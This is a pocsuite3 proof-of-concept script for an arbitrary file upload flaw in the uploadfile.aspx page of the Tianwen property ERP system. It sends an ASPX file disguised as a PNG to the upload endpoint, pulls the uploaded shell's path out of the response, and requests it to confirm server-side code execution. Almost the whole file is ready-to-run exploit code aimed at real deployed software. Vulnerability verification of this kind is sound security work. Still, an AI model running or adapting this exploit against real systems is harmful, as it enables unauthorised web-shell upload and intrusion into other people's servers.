from collections import OrderedDict
from urllib.parse import urljoin
import re,os
from requests_toolbelt import MultipartEncoder
from pocsuite3.api import POCBase, Output, register_poc, logger, requests, OptDict, OptString, VUL_TYPE
from pocsuite3.api import REVERSE_PAYLOAD, POC_CATEGORY


class POC(POCBase):
    vulID = '0'  # ssvid ID 如果是提交漏洞的同时提交 PoC,则写成 0
    version = '1'  #默认为1
    author = ['luckying']  #  PoC作者的大名
    vulDate = '2021-10-25'  #漏洞公开的时间,不知道就写今天
    createDate = '2021-10-25'  # 编写 PoC 的日期
    updateDate = '2021-10-25'  # PoC 更新的时间,默认和编写时间一样
    references = ['']  # 漏洞地址来源,0day不用写
    name = '天问物业ERP系统 uploadfile.aspx 任意文件上传'  # PoC 名称
    appPowerLink = ''  # 漏洞厂商主页地址
    appName = '成都天问互联科技有限公司 天问物业ERP系统'  # 漏洞应用名称
    appVersion = '''ALL'''  # 漏洞影响版本
    vulType = VUL_TYPE.UPLOAD_FILES  #漏洞类型,类型参考见 漏洞类型规范表
    desc = '''
        成都天问互联科技有限公司 天问物业ERP系统 uploadfile.aspx 存在任意文件读取  
    '''

  # 漏洞简要描述
    samples = ['']  # 测试样列,就是用 PoC 测试成功的网站
    install_requires = ['']  # PoC 第三方模块依赖，请尽量不要使用第三方模块，必要时请参考《PoC第三方模块依赖说明》填写
    pocDesc = '''
    检测:pocsuite -r .\poc++.py -u url(-f url.txt) --verify 
    验证时会上传shell.aspx 访问一次后自动删除，不对系统照成影响
    '''
    category = POC_CATEGORY.EXPLOITS.REMOTE

    def _verify(self):
        result = {}
        path = "/HM/M_Main/uploadfile.aspx"
        url = self.url + path
        #创建一个需要上传的jsp文件写入测试内容
        m = MultipartEncoder(fields={"__VIEWSTATE":"/wEPDwUKLTg1NDU3MTA4OQ9kFgICAQ8WAh4HZW5jdHlwZQUTbXVsdGlwYXJ0L2Zvcm0tZGF0YWRk70CKfgUcso35StfmoNB/ObwwU8W4qvmgqa52HxmqsU0=",
                            "__VIEWSTATEGENERATOR":"DE1005D5",
                            "__EVENTVALIDATION":"/wEdAAIk02sIXo/TRIPUygBB64GvmW/ynBkkkA2xI95ik8Vs4GXPPWvIYnA84468jdc5Wr+nrufsSY+RKtcm7vKIotDs",
                            "BtnSave":"确定上传",
                            "upload_img":("1.aspx",'<%@Page Language="C#"%><%Response.Write(System.Text.Encoding.GetEncoding(65001).GetString(System.Convert.FromBase64String("ZTE2NTQyMTExMGJhMDMwOTlhMWMwMzkzMzczYzViNDM=")));System.IO.File.Delete(Request.PhysicalPath);%>',"image/png")})
                            
        headers={
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36',
            "Content-Type": m.content_type
            }
        try:
            resq = requests.post(url=url,headers=headers,data=m)
            if  resq.status_code==200 and 'UploadCallBack' in resq.text:
                #正则提取返回shell地址
                pattern = re.compile(u"(?<=\(')(.*)(?='\))")
                str = resq.text
                shell_url=pattern.search(str).group()
                resq_shell=requests.get(url=self.url+shell_url)
                if  resq_shell.status_code==200 and 'e165421110ba03099a1c0393373c5b43' in resq_shell.text:
                    result['VerifyInfo'] = {}
                    result['VerifyInfo']['URL'] = url
                    result['VerifyInfo']['path'] = self.url+shell_url
        except Exception as e:
            return
        return self.parse_output(result)

    def _attack(self):
        return self._verify()

    def parse_attack(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output

    def _shell(self):
        return

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output


register_poc(POC)
